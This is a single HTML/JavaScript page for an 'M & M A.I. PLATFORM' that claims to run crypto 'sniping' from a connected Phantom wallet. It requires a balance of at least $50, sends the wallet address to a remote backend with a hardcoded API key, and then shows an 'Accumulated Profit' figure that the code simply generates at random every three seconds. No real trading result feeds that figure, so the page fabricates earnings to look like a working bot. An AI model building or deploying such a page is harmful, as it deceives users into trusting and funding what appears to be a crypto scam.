<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>M & M A.I. PLATFORM</title>
  <style>
    body {
      background: radial-gradient(circle at top, #0a0f1f, #000);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      text-align: center;
      padding: 20px;
    }
    h1 {
      font-size: 2.5rem;
      color: #00ffff;
      text-shadow: 0 0 10px #00ffff;
    }
    .button {
      background-color: #1f1fff;
      border: none;
      padding: 15px 30px;
      font-size: 1.2rem;
      color: white;
      cursor: pointer;
      border-radius: 12px;
      margin: 10px;
      box-shadow: 0 0 20px #1f1fff;
      animation: pulse 2s infinite;
    }
    .button:disabled {
      background-color: #555;
      box-shadow: none;
      cursor: not-allowed;
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 5px #00ffff; }
      50% { box-shadow: 0 0 20px #00ffff; }
      100% { box-shadow: 0 0 5px #00ffff; }
    }
    #status, #profit {
      margin-top: 20px;
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <h1>M & M A.I. PLATFORM</h1>
  <button class="button" id="connectButton">Connect to Phantom</button>
  <button class="button" id="startSniping" disabled>Start Sniping</button>
  <button class="button" id="stopSniping">Stop Sniping</button>

  <div id="status">Status: Waiting for wallet connection...</div>
  <div id="profit">Accumulated Profit: $0.00</div>

  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <script>
    const API_BASE = 'https://tbrl-backend-samuel-s-projects-545d58d6.vercel.app';
    const API_KEY = 'crypto-api-secure-key-2025';
    let walletAddress = null;
    let profit = 0;
    let interval = null;

    const connectButton = document.getElementById('connectButton');
    const startButton = document.getElementById('startSniping');
    const stopButton = document.getElementById('stopSniping');
    const statusDiv = document.getElementById('status');
    const profitDiv = document.getElementById('profit');

    async function checkBalance() {
      try {
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        const publicKey = new solanaWeb3.PublicKey(walletAddress);
        const balance = await connection.getBalance(publicKey);
        const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;
        const usd = sol * 150;
        return usd;
      } catch (err) {
        console.error("Balance error:", err);
        return 0;
      }
    }

    async function connectWallet() {
      if (!window.solana || !window.solana.isPhantom) {
        statusDiv.textContent = 'Phantom Wallet not detected. Please install Phantom.';
        return;
      }

      try {
        const resp = await window.solana.connect();
        walletAddress = resp.publicKey.toString();
        statusDiv.textContent = `Connected: ${walletAddress}`;
        const usd = await checkBalance();
        if (usd >= 50) {
          statusDiv.textContent += ` | Balance OK: $${usd.toFixed(2)}`;
          startButton.disabled = false;
        } else {
          statusDiv.textContent += ` | Insufficient SOL ($${usd.toFixed(2)}). Need $50+`;
        }
      } catch (err) {
        console.error('Connection error:', err);
        statusDiv.textContent = `Wallet connection failed: ${err.message || err}`;
      }
    }

    connectButton.addEventListener('click', connectWallet);

    startButton.addEventListener('click', async () => {
      try {
        statusDiv.textContent = 'Verifying wallet and starting sniping...';
        const res = await fetch(`${API_BASE}/api/start`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': API_KEY
          },
          body: JSON.stringify({ wallet: walletAddress })
        });

        const data = await res.json();
        if (data.success) {
          statusDiv.textContent = 'Sniping started.';
          simulateProfit();
        } else {
          statusDiv.textContent = 'Error: ' + data.error;
        }
      } catch (err) {
        console.error("Start error:", err);
        statusDiv.textContent = 'Network error while starting sniping.';
      }
    });

    stopButton.addEventListener('click', async () => {
      clearInterval(interval);
      try {
        const res = await fetch(`${API_BASE}/api/stop`, {
          method: 'POST',
          headers: { 'x-api-key': API_KEY }
        });
        const data = await res.json();
        if (data.success) {
          statusDiv.textContent = 'Sniping stopped.';
        } else {
          statusDiv.textContent = 'Error: ' + data.error;
        }
      } catch (err) {
        console.error("Stop error:", err);
        statusDiv.textContent = 'Network error while stopping.';
      }
    });

    function simulateProfit() {
      interval = setInterval(() => {
        const gain = (Math.random() * 4.9 + 0.1).toFixed(2);
        profit += parseFloat(gain);
        profitDiv.textContent = `Accumulated Profit: $${profit.toFixed(2)}`;
      }, 3000);
    }

    window.addEventListener('load', async () => {
      if (window.solana && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect({ onlyIfTrusted: true });
          walletAddress = resp.publicKey.toString();
          statusDiv.textContent = `Auto-connected: ${walletAddress}`;
          const usd = await checkBalance();
          if (usd >= 50) {
            statusDiv.textContent += ` | Balance OK: $${usd.toFixed(2)}`;
            startButton.disabled = false;
          } else {
            statusDiv.textContent += ` | Insufficient balance: $${usd.toFixed(2)}`;
          }
        } catch {
          statusDiv.textContent = 'Phantom detected. Connect to begin.';
        }
      } else {
        statusDiv.textContent = 'Phantom Wallet not detected.';
      }
    });
  </script>
</body>
</html>
